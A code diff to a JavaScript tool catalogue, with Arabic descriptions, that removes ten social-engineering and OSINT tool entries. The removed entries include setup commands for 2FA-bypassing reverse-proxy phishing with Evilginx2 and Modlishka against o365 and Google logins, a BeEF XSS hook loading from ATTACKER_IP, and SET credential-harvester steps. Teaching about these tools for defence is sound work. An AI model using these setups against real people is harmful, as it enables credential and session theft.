@@ -2597,210 +2597,6 @@ const TOOLS = [
   ],
   tips: ['⚠️ للأغراض التعليمية فقط — أي استخدام ضد أشخاص حقيقيين يُعد جريمة','💡 استخدم Localhost للتجربة المحلية','🛡️ الهدف: فهم آلية Phishing لحماية مؤسستك'],
   related: ['SET (Social-Engineer Toolkit)', 'Gophish', 'King Phisher', 'BlackEye'],
-},
-
-// ============================================================
-// SOCIAL ENGINEERING TOOLS (1007-1016)
-// ============================================================
-{
-  id: 1007,
-  name: 'SET (Social-Engineer Toolkit)',
-  icon: '🎭',
-  color: 'rgba(255,100,200,0.12)',
-  short: 'إطار شامل لهجمات الهندسة الاجتماعية',
-  cat: 'social',
-  tags: ['social', 'phishing', 'exploit', 'payload'],
-  desc: 'أداة اختبار اختراق متقدمة مصممة خصيصاً لمحاكاة هجمات الهندسة الاجتماعية. تتضمن قوالب تصيد، إنشاء Payloads، استنساخ مواقع، وهجمات USB/QR.',
-  features: ['إنشاء صفحات تصيد احتيالي متقدمة','استنساخ مواقع حقيقية بنقرة واحدة','توليد Payloads مخصصة','هجمات Mass Mailer و SMS Spoofing','تكامل مع Metasploit Framework','قوالب PowerShell و HTA'],
-  install: 'sudo apt update && sudo apt install -y set\n# أو من GitHub:\ngit clone https://github.com/trustedsec/social-engineer-toolkit.git\ncd social-engineer-toolkit && pip3 install -r requirements.txt\nsudo python3 setup.py install',
-  version: 'setoolkit --version',
-  commands: [
-    { cmd: 'sudo setoolkit', note: 'تشغيل القائمة الرئيسية' },
-    { cmd: '# 1) Social-Engineering Attacks\n# 2) Website Attack Vectors\n# 3) Credential Harvester Attack\n# 4) Site Cloner', note: 'استنساخ موقع لجمع بيانات الدخول' },
-    { cmd: '# 1) Social-Engineering Attacks\n# 9) Powershell Attack Vectors\n# 1) Powershell Alphanumeric Shellcode Injector', note: 'إنشاء Payload عبر PowerShell' }
-  ],
-  tips: ['⚠️ استخدم فقط في بيئة اختبار مصرح بها','💡 الخيار Site Cloner مفيد لاختبارات Security Awareness','🛡️ تأكد من الحصول على تصريح كتابي قبل أي اختبار'],
-  related: ['Gophish', 'Zphisher', 'BeEF', 'King Phisher'],
-},
-{
-  id: 1008,
-  name: 'Gophish',
-  icon: '🐟',
-  color: 'rgba(0,180,255,0.12)',
-  short: 'منصة محاكاة التصيد الاحتيالي للمؤسسات',
-  cat: 'social',
-  tags: ['social', 'phishing', 'awareness', 'reporting'],
-  desc: 'منصة مفتوحة المصدر لإدارة حملات التصيد الاحتيالي التعليمية. توفر لوحة تحكم ويب، تتبع النتائج، قوالب بريد إلكتروني، وتقارير مفصلة.',
-  features: ['لوحة تحكم ويب سهلة الاستخدام','إنشاء قوالب بريد إلكتروني مخصصة','تتبع فتح الرسائل والنقرات','صفحات هبوط مخصصة','تقارير مفصلة بالرسوم البيانية','API كامل للأتمتة'],
-  install: 'wget https://github.com/gophish/gophish/releases/latest/download/gophish-v0.12.1-linux-64bit.zip\nunzip gophish-v0.12.1-linux-64bit.zip -d gophish\ncd gophish && chmod +x gophish',
-  version: './gophish --version',
-  commands: [
-    { cmd: 'cd gophish && sudo ./gophish', note: 'تشغيل الخادم (المنفذ 3333 للإدارة)' },
-    { cmd: '# الوصول للوحة التحكم:\n# https://localhost:3333\n# المستخدم: admin\n# كلمة المرور: تظهر في الطرفية', note: 'الدخول للوحة الإدارة' },
-    { cmd: 'curl -H "Authorization: Bearer API_KEY" https://localhost:3333/api/campaigns/', note: 'عرض الحملات عبر API' }
-  ],
-  tips: ['💡 استخدم SMTP حقيقي لنتائج واقعية','📊 راجع التقارير لتحسين وعي الموظفين','🛡️ مثالي لبرامج Security Awareness Training'],
-  related: ['SET (Social-Engineer Toolkit)', 'King Phisher', 'Zphisher', 'Evilginx2'],
-},
-{
-  id: 1009,
-  name: 'Evilginx2',
-  icon: '🦈',
-  color: 'rgba(255,50,50,0.12)',
-  short: 'إطار هجمات Man-in-the-Middle للتصيد المتقدم',
-  cat: 'social',
-  tags: ['social', 'phishing', 'mitm', '2fa-bypass'],
-  desc: 'أداة متقدمة لمحاكاة هجمات التصيد باستخدام Reverse Proxy، قادرة على تجاوز المصادقة الثنائية (2FA) عبر اعتراض Session Tokens في الوقت الحقيقي.',
-  features: ['تجاوز المصادقة الثنائية (2FA)','Reverse Proxy شفاف','اعتراض Session Cookies','قوالب Phishlets جاهزة','دعم SSL/TLS تلقائي','تخصيص النطاقات الفرعية'],
-  install: 'sudo apt install -y golang\ngo install github.com/kgretzky/evilginx2@latest\n# أو:\ngit clone https://github.com/kgretzky/evilginx2.git\ncd evilginx2 && make',
-  version: 'evilginx2 --version',
-  commands: [
-    { cmd: 'sudo evilginx2', note: 'تشغيل الأداة (يتطلب صلاحيات root)' },
-    { cmd: 'config domain yourdomain.com\nconfig ip 1.2.3.4\nphishlets hostname o365 login.yourdomain.com', note: 'إعداد النطاق وتهيئة Phishlet' },
-    { cmd: 'phishlets enable o365\nlures create o365\nlures get-url 0', note: 'تفعيل Phishlet وإنشاء رابط التصيد' }
-  ],
-  tips: ['⚠️ خطير جداً - يتجاوز 2FA فعلياً','🔬 استخدم فقط في اختبارات مصرح بها رسمياً','🛡️ لاختبار مقاومة مؤسستك لهجمات التصيد المتقدمة'],
-  related: ['Modlishka', 'Muraena', 'Gophish', 'SET (Social-Engineer Toolkit)'],
-},
-{
-  id: 1010,
-  name: 'BeEF (Browser Exploitation Framework)',
-  icon: '🥩',
-  color: 'rgba(200,80,0,0.12)',
-  short: 'إطار استغلال المتصفحات للاختبار الأمني',
-  cat: 'social',
-  tags: ['social', 'exploit', 'web', 'xss'],
-  desc: 'إطار عمل متقدم يركز على استغلال ثغرات المتصفح. يُستخدم لاختبار أمان تطبيقات الويب عبر حقن JavaScript Hook في المتصفح المستهدف.',
-  features: ['Hook متصفحات عبر XSS','أكثر من 300 وحدة استغلال','التحكم الكامل بالمتصفح المُخترق','جمع معلومات النظام والشبكة','هجمات Social Engineering عبر المتصفح','تكامل مع Metasploit'],
-  install: 'sudo apt update && sudo apt install -y beef-xss\n# أو من GitHub:\ngit clone https://github.com/beefproject/beef.git\ncd beef && bundle install',
-  version: 'beef-xss --version 2>/dev/null || echo "BeEF installed"',
-  commands: [
-    { cmd: 'sudo beef-xss', note: 'تشغيل BeEF (الإدارة: http://127.0.0.1:3000/ui/panel)' },
-    { cmd: '# Hook Script:\n# <script src="http://ATTACKER_IP:3000/hook.js"></script>\n# يُحقن في صفحة ويب ضعيفة عبر XSS', note: 'حقن Hook في صفحة مستهدفة' },
-    { cmd: '# في لوحة التحكم:\n# Commands > Social Engineering > Pretty Theft\n# يعرض نافذة تسجيل دخول مزيفة للمستخدم', note: 'تنفيذ هجمة Pretty Theft' }
-  ],
-  tips: ['💡 دمج مع XSS لاختبار فعالية WAF','⚠️ يتطلب ثغرة XSS فعلية أو وصول مادي','🛡️ اختبار مدى وعي المستخدمين بالنوافذ المنبثقة المشبوهة'],
-  related: ['SET (Social-Engineer Toolkit)', 'Metasploit', 'XSSer', 'Burp Suite'],
-},
-{
-  id: 1011,
-  name: 'King Phisher',
-  icon: '👑',
-  color: 'rgba(255,215,0,0.12)',
-  short: 'أداة محاكاة حملات التصيد الاحتيالي',
-  cat: 'social',
-  tags: ['social', 'phishing', 'awareness', 'campaign'],
-  desc: 'أداة مفتوحة المصدر لمحاكاة هجمات التصيد الاحتيالي واختبار وعي الموظفين. توفر خادم مخصص، قوالب Jinja2، وتتبع تفصيلي للنتائج.',
-  features: ['خادم مخصص لحملات التصيد','قوالب Jinja2 مرنة','تتبع فتح الرسائل والنقرات','2FA للوحة الإدارة','إرسال SMS للتصيد','Plugin system قابل للتوسيع'],
-  install: 'git clone https://github.com/rsmusllp/king-phisher.git\ncd king-phisher && sudo tools/install.sh',
-  version: 'king-phisher --version',
-  commands: [
-    { cmd: 'sudo king-phisher-server -L INFO', note: 'تشغيل خادم King Phisher' },
-    { cmd: 'king-phisher-client', note: 'تشغيل واجهة العميل الرسومية' },
-    { cmd: '# إعداد حملة جديدة:\n# 1. أنشئ قالب بريد بـ Jinja2\n# 2. حدد قائمة الأهداف (CSV)\n# 3. اختر صفحة الهبوط\n# 4. أطلق الحملة وتتبع النتائج', note: 'خطوات إنشاء حملة تصيد' }
-  ],
-  tips: ['📊 استخدم التقارير لتحسين برنامج التوعية','💡 ابدأ بحملة صغيرة ثم وسّع','🛡️ مثالي للمؤسسات لاختبار وعي موظفيها'],
-  related: ['Gophish', 'SET (Social-Engineer Toolkit)', 'Zphisher', 'PhishMe'],
-},
-{
-  id: 1012,
-  name: 'Maltego',
-  icon: '🕸️',
-  color: 'rgba(100,200,255,0.12)',
-  short: 'أداة تحليل الروابط وجمع المعلومات المرئي',
-  cat: 'social',
-  tags: ['social', 'recon', 'osint', 'network'],
-  desc: 'أداة OSINT رسومية قوية لتحليل العلاقات بين الأشخاص والمنظمات والبنية التحتية. تحول البيانات المفتوحة إلى رسوم بيانية تفاعلية تكشف الروابط المخفية.',
-  features: ['رسوم بيانية تفاعلية للعلاقات','أكثر من 100 Transform جاهز','تكامل مع Shodan, VirusTotal, WHOIS','تحليل شبكات التواصل الاجتماعي','اكتشاف البنية التحتية للشبكات','تقارير PDF احترافية'],
-  install: 'sudo apt update && sudo apt install -y maltego\n# أو حمل النسخة المجانية Maltego CE من:\n# https://www.maltego.com/downloads/',
-  version: 'maltego --version 2>/dev/null || echo "Launch Maltego GUI"',
-  commands: [
-    { cmd: 'maltego', note: 'تشغيل واجهة Maltego الرسومية' },
-    { cmd: '# 1. أنشئ Graph جديد\n# 2. أضف Entity (مثل Domain)\n# 3. Right-click > Run Transform\n# 4. اختر "To DNS Name" أو "To Email"', note: 'بدء تحليل نطاق' },
-    { cmd: '# Transform: Domain → Emails → Person → Social Media\n# يكشف العلاقات بين الأصول الرقمية', note: 'تتبع سلسلة العلاقات' }
-  ],
-  tips: ['💡 ابدأ بـ Maltego CE المجاني للتعلم','🔍 استخدم Transforms المجانية أولاً','⚠️ بعض Transforms تتطلب API Keys مدفوعة'],
-  related: ['theHarvester', 'Recon-ng', 'SpiderFoot', 'Sherlock'],
-},
-{
-  id: 1013,
-  name: 'Sherlock',
-  icon: '🔍',
-  color: 'rgba(0,255,150,0.12)',
-  short: 'البحث عن أسماء المستخدمين عبر منصات التواصل',
-  cat: 'social',
-  tags: ['social', 'osint', 'recon', 'username'],
-  desc: 'أداة OSINT تبحث عن اسم مستخدم محدد عبر أكثر من 400 موقع ومنصة تواصل اجتماعي. مفيدة لتتبع البصمة الرقمية وتقييم مخاطر التعرض.',
-  features: ['بحث عبر 400+ منصة','سرعة عالية مع Multi-threading','تصدير النتائج بصيغ متعددة','كشف الحسابات المرتبطة','دعم Tor للخصوصية','تحديث مستمر للمنصات'],
-  install: 'git clone https://github.com/sherlock-project/sherlock.git\ncd sherlock && pip3 install -r requirements.txt',
-  version: 'python3 sherlock --version',
-  commands: [
-    { cmd: 'python3 sherlock username123', note: 'بحث عن اسم مستخدم عبر جميع المنصات' },
-    { cmd: 'python3 sherlock user1 user2 user3 --output results.txt', note: 'بحث عن عدة مستخدمين وحفظ النتائج' },
-    { cmd: 'python3 sherlock target --tor --timeout 15', note: 'بحث عبر شبكة Tor لمزيد من الخصوصية' }
-  ],
-  tips: ['💡 استخدم --print-found لعرض النتائج الإيجابية فقط','🔒 استخدم --tor عند البحث الحساس','📊 دمج النتائج مع Maltego لتحليل أعمق'],
-  related: ['theHarvester', 'Maltego', 'Social Mapper', 'Recon-ng'],
-},
-{
-  id: 1014,
-  name: 'theHarvester',
-  icon: '🌾',
-  color: 'rgba(180,255,100,0.12)',
-  short: 'جمع المعلومات من المصادر المفتوحة',
-  cat: 'social',
-  tags: ['social', 'osint', 'recon', 'email'],
-  desc: 'أداة OSINT لجمع عناوين البريد الإلكتروني والنطاقات الفرعية وعناوين IP من محركات البحث والمصادر المفتوحة. أساسية في مرحلة الاستطلاع.',
-  features: ['جمع الإيميلات من مصادر متعددة','اكتشاف النطاقات الفرعية','دعم 20+ مصدر بيانات','تصدير XML و JSON','تكامل مع Shodan و Censys','DNS Brute Force'],
-  install: 'sudo apt update && sudo apt install -y theharvester\n# أو:\npip3 install theHarvester',
-  version: 'theHarvester --version',
-  commands: [
-    { cmd: 'theHarvester -d example.com -b google -l 200', note: 'جمع معلومات عن نطاق من Google' },
-    { cmd: 'theHarvester -d example.com -b all -f results.html', note: 'بحث شامل في جميع المصادر مع تصدير' },
-    { cmd: 'theHarvester -d example.com -b linkedin -l 100', note: 'جمع أسماء الموظفين من LinkedIn' }
-  ],
-  tips: ['💡 استخدم -b all للبحث الشامل','🔑 بعض المصادر تتطلب API Keys','📊 النتائج مفيدة لحملات التصيد المستهدف (Spear Phishing)'],
-  related: ['Maltego', 'Sherlock', 'Recon-ng', 'SpiderFoot'],
-},
-{
-  id: 1015,
-  name: 'Social Mapper',
-  icon: '📍',
-  color: 'rgba(255,150,50,0.12)',
-  short: 'ربط حسابات التواصل الاجتماعي بالتعرف على الوجوه',
-  cat: 'social',
-  tags: ['social', 'osint', 'recon', 'facial-recognition'],
-  desc: 'أداة OSINT تستخدم التعرف على الوجوه لربط ملفات التواصل الاجتماعي عبر منصات مختلفة. تأخذ قائمة أسماء وصور وتبحث عنها تلقائياً.',
-  features: ['التعرف على الوجوه عبر المنصات','دعم LinkedIn, Facebook, Twitter, Instagram','تقارير HTML مفصلة','معالجة دفعات كبيرة','تحديد الهوية عبر الصور','ربط الحسابات المتعددة'],
-  install: 'git clone https://github.com/Greenwolf/social_mapper.git\ncd social_mapper && pip3 install -r requirements.txt\n# يتطلب Firefox و geckodriver',
-  version: 'python3 social_mapper.py --version 2>/dev/null || echo "Social Mapper ready"',
-  commands: [
-    { cmd: 'python3 social_mapper.py -f imagefolder -i targets/ -m fast -fb -tw', note: 'بحث سريع في Facebook و Twitter' },
-    { cmd: 'python3 social_mapper.py -f csv -i targets.csv -m accurate -a', note: 'بحث دقيق في جميع المنصات من ملف CSV' },
-    { cmd: 'python3 social_mapper.py -f company -i "Company Name" -m fast -li', note: 'البحث عن موظفي شركة في LinkedIn' }
-  ],
-  tips: ['⚠️ يتطلب حسابات وهمية في المنصات','🔬 الوضع الدقيق (accurate) أبطأ لكن أدق','📊 النتائج مفيدة لتقييم البصمة الرقمية للمؤسسة'],
-  related: ['Sherlock', 'Maltego', 'theHarvester', 'Recon-ng'],
-},
-{
-  id: 1016,
-  name: 'Modlishka',
-  icon: '🦎',
-  color: 'rgba(150,0,255,0.12)',
-  short: 'Reverse Proxy للتصيد المتقدم وتجاوز 2FA',
-  cat: 'social',
-  tags: ['social', 'phishing', 'mitm', '2fa-bypass'],
-  desc: 'أداة Reverse Proxy متقدمة للتصيد الاحتيالي، تعمل كوسيط شفاف بين الضحية والموقع الحقيقي. قادرة على اعتراض بيانات الاعتماد وتجاوز 2FA.',
-  features: ['Reverse Proxy شفاف بالكامل','تجاوز المصادقة الثنائية (2FA)','اعتراض Cookies و Tokens','تعديل المحتوى في الوقت الحقيقي','دعم شهادات SSL/TLS','سهل التخصيص والإعداد'],
-  install: 'sudo apt install -y golang\ngo install github.com/drk1wi/Modlishka@latest\n# أو:\ngit clone https://github.com/drk1wi/Modlishka.git\ncd Modlishka && make',
-  version: './Modlishka --version 2>/dev/null || echo "Modlishka ready"',
-  commands: [
-    { cmd: 'sudo ./Modlishka -config modlishka.json', note: 'تشغيل بملف تكوين' },
-    { cmd: '# modlishka.json:\n# {\n#   "phishingDomain": "yourdomain.com",\n#   "target": "accounts.google.com",\n#   "listeningPort": 443\n# }', note: 'مثال ملف التكوين' },
-    { cmd: '# الضحية يزور: https://yourdomain.com\n# Modlishka يوجه الطلبات لـ Google\n# يعترض credentials + 2FA tokens', note: 'آلية عمل الهجمة' }
-  ],
-  tips: ['⚠️ أداة خطيرة جداً - للاختبار المصرح فقط','🔬 استخدم مع نطاق اختبار خاص','🛡️ تعلّم كيف تعمل لتحمي مؤسستك من هذا النوع من الهجمات'],
-  related: ['Evilginx2', 'Muraena', 'Gophish', 'SET (Social-Engineer Toolkit)'],
 }
 
 ]; // END OF TOOLS DATABASE
@@ -3091,9 +2887,8 @@ function getRecentTools() {
 }
 
 function trackRecentTool(id) {
-  const numId = Number(id);
-  const current = getRecentTools().map(Number).filter(item => item !== numId);
-  current.unshift(numId);
+  const current = getRecentTools().filter(item => item !== id);
+  current.unshift(id);
   const next = current.slice(0, 6);
   localStorage.setItem(RECENT_TOOLS_KEY, JSON.stringify(next));
   renderRecentTools();
@@ -3105,7 +2900,7 @@ function renderRecentTools() {
   if (!container || !list) return;
 
   const ids = getRecentTools();
-  const tools = ids.map(id => TOOLS.find(tool => tool.id === Number(id))).filter(Boolean);
+  const tools = ids.map(id => TOOLS.find(tool => tool.id === id)).filter(Boolean);
 
   if (!tools.length) {
     container.style.display = 'none';
